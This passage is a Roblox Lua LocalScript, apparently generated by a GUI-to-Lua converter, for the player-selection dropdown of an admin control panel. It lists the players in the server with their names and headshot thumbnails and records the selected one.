-- Workspace.AdminControlPanel.LocalScript
local function C_2()
local script = G2L["2"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- Get GUI elements
	local gui = script.Parent
	local mainFrame = gui:WaitForChild("Frame")
	local scrollingFrame = mainFrame:WaitForChild("ScrollingFrame")
	
	local userSelection = scrollingFrame:WaitForChild("userselection")
	local userSelectionButton = userSelection:WaitForChild("TextButton")
	local userSelectionProfile = userSelection:WaitForChild("profile")
	local userSelectionUsername = userSelection:FindFirstChild("username/display")
	
	local userList = scrollingFrame:WaitForChild("userlist")
	local template = userList:WaitForChild("template")
	
	-- Hide template
	template.Visible = false
	
	-- Track dropdown state and selected player
	local dropdownOpen = false
	_G.selectedPlayer = nil
	
	-- Function to update userlist frame size
	local function updateUserListSize()
		local playerCount = 0
		for _, child in ipairs(userList:GetChildren()) do
			if child:IsA("Frame") and child.Visible and child ~= template then
				playerCount = playerCount + 1
			end
		end
	
		-- Each player frame is 40px tall
		userList.Size = UDim2.new(1, 0, 0, 40 + (playerCount * 40)) -- 40px base + 40px per player
	end
	
	-- Toggle dropdown
	userSelectionButton.MouseButton1Click:Connect(function()
		dropdownOpen = not dropdownOpen
	
		if dropdownOpen then
			-- Open dropdown
			userSelectionButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red
			userList.Visible = true
		else
			-- Close dropdown
			userSelectionButton.BackgroundColor3 = Color3.fromRGB(14, 255, 0) -- Green
			userList.Visible = false
		end
	end)
	
	-- Function to update user selection display
	local function updateUserSelection(player)
		_G.selectedPlayer = player
	
		-- Update username/display
		if userSelectionUsername then
			userSelectionUsername.Text = player.Name .. " / " .. player.DisplayName
		end
	
		-- Update profile picture
		local userId = player.UserId
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size150x150
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
		userSelectionProfile.Image = content
	end
	
	-- Function to create player entry
	local function createPlayerEntry(player)
		-- Clone template
		local entry = template:Clone()
		entry.Name = player.Name
		entry.Visible = true
	
		-- Get elements
		local entryProfile = entry:WaitForChild("profile")
		local entryUsername = entry:FindFirstChild("username/display")
		local selectButton = entry:WaitForChild("SELECT")
	
		-- Set username/display
		if entryUsername then
			entryUsername.Text = player.Name .. " / " .. player.DisplayName
		end
	
		-- Set profile picture
		local userId = player.UserId
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size150x150
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
		entryProfile.Image = content
	
		-- Select button functionality
		selectButton.MouseButton1Click:Connect(function()
			updateUserSelection(player)
	
			-- Close dropdown
			dropdownOpen = false
			userSelectionButton.BackgroundColor3 = Color3.fromRGB(14, 255, 0) -- Green
			userList.Visible = false
		end)
	
		-- Parent LAST (after everything is set up)
		entry.Parent = userList
	
		-- Update size after adding player
		updateUserListSize()
	
		return entry
	end
	
	-- Function to remove player entry
	local function removePlayerEntry(player)
		local entry = userList:FindFirstChild(player.Name)
		if entry and entry ~= template then
			entry:Destroy()
		end
	
		-- If selected player left, clear selection
		if _G.selectedPlayer == player then
			_G.selectedPlayer = nil
			if userSelectionUsername then
				userSelectionUsername.Text = "username / display"
			end
			userSelectionProfile.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
		end
	
		-- Update size after removing player
		updateUserListSize()
	end
	
	-- Function to populate all existing players
	local function populatePlayers()
		-- Clear existing entries (except template)
		for _, child in ipairs(userList:GetChildren()) do
			if child:IsA("Frame") and child ~= template and child.Name ~= "UIListLayout" then
				child:Destroy()
			end
		end
	
		-- Add all players
		for _, player in ipairs(Players:GetPlayers()) do
			createPlayerEntry(player)
		end
	
		-- Update size
		updateUserListSize()
	end
	
	-- Connect player events
	Players.PlayerAdded:Connect(function(player)
		createPlayerEntry(player)
	end)
	
	Players.PlayerRemoving:Connect(function(player)
		removePlayerEntry(player)
	end)
	
	-- Initial population
	populatePlayers()
	
	-- INITIALLY HIDE USERLIST (THIS WAS MISSING AT THE END)
	userList.Visible = false
end;
